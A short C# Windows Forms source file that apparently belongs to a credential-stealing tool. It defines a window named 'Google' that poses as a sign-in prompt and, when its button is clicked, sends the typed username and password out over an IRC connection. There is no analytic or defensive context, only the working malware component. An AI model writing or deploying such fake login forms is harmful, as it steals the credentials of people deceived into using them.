using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace tom
{
    public partial class Google : Form
    {
        IRC irc;

        public Google(IRC irc)
        {
            InitializeComponent();
            this.irc = irc;
            tbUser.Focus();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            irc.SendMessage("Google - User: " + tbUser.Text + ", Pass: " + tbPass.Text);
            this.Close();
        }

        private void Google_Load(object sender, EventArgs e)
        {
            Console.WriteLine("test");
        }
    }
}
